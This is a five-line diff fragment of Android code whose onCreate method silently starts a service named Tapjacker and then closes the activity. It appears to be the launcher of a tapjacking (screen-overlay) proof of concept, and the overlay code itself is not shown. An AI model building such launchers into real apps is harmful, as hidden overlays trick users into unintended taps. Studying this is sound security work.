@@ -1,0 +1,5 @@
+{
+  super.onCreate(savedInstanceState);
+  startService(new Intent(this,Tapjacker.class));
+  finish();
+}
